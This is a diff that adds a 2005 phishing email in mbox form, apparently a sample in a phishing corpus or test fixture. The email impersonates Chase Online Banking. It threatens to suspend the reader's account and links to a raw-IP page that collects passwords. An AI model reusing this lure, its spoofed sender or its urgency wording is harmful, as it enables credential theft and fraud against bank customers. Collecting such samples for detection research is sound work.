@@ -1,0 +1,141 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 32B2A2A88C
+ for <user@example.com>; Tue, 11 Oct 2005 12:32:09 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 2A535621C71; Tue, 11 Oct 2005 12:32:09 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 0BD83621C66
+ for <user@example.com>; Tue, 11 Oct 2005 12:32:08 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id MAA07058
+ for user@example.com; Tue, 11 Oct 2005 12:32:08 -0400
+Received: from internet.2km.cz (mail.2km.cz [81.30.255.207])
+ by mail.example.com with ESMTP id MAA07050
+ for <user@example.com>; Tue, 11 Oct 2005 12:32:06 -0400
+Received: (from root@localhost)
+ by internet.2km.cz (8.11.6/8.11.6/SuSE Linux 0.5) id j9BGVq607962;
+ Tue, 11 Oct 2005 18:31:52 +0200
+Date: Tue, 11 Oct 2005 18:31:52 +0200
+Message-Id: <200510111631.j9BGVq607962@internet.2km.cz>
+To: user@example.com
+Subject: Password Change Required
+From: Chase Online Banking <profile@chase.com>
+Content-Type: text/html
+Content-Length: 4329
+Lines: 108
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 193
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Untitled Document</title>
+</head>
+
+<body>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+  <TBODY>
+    <TR vAlign=top>
+      <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"
+width=400><TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+          <TBODY>
+            <TR vAlign=top>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><p><img
+src="https://chaseonline.chase.com/content/ecpweb/sso/image/chaseNew.gif" width="138" height="27"></p>
+              <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD class=pp_heading align=left><div align="center"><BR>
+                            <strong>Password change required!</strong></div></TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><BR>
+                Dear sir, <BR>
+                <BR>
+                We recently have determined that different computers have logged onto your Chase 
+                <span class="bodyText">user profile </span>account, and multiple
+password failures were present before the logons. We strongly advice CHANGE YOUR PASSWORD. <BR>
+                <BR>
+                If this is not completed by <STRONG>October 15, 2005</STRONG>, we will be forced to suspend your
+account indefinitely, as it may have been used for fraudulent purposes. Thank you for your cooperation. <BR>
+                <BR>
+&nbsp;
+                <TABLE cellSpacing=0 cellPadding=1 width="75%" align=left bgColor=#ffe65c
+border=0>
+                  <TBODY>
+                    <TR>
+                      <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><TABLE cellSpacing=0
+cellPadding=4 width="100%" align=center bgColor=#dfdffd
+border=0>
+                          <TBODY>
+                            <TR>
+                              <TD class=pp_sansserif align=middle><A
+href="http://202.154.225.152:81/.profile/index.php?prospect_nfpb=trueportlet_signup_1_actionOverrideFchaseonlineFsignupFverifyDetails_windowLabel_portlet_signup_pageLabel_page_signup"
+target=_blank>Click here to Change Your Password</A></TD>
+                            </TR>
+                          </TBODY>
+                      </TABLE></TD>
+                    </TR>
+                  </TBODY>
+                </TABLE>
+                <P><BR>
+                    <BR>
+                    <BR>
+                    Thank you for your prompt attention to this matter. <BR>
+                    <BR>
+                    We apologize for any inconvenience.<BR>
+                  <BR>
+                  <BR>
+                  <BR>
+                  Thank you for using Chase! </P></TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><HR class=dotted>
+              </TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><TABLE cellSpacing=0
+cellPadding=0 width="100%" border=0>
+                  <TBODY>
+                    <TR>
+                      <TD class=pp_footer>Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. </TD>
+                    <TR>
+                      <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><IMG
+height=10 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1
+border=0></TD>
+                    </TR>
+                  </TBODY>
+              </TABLE></TD>
+            </TR>
+            <TR>
+              <TD
+style="FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif"><BR>
+                  <SPAN
+class=pp_footer></SPAN></TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</body>
+</html>
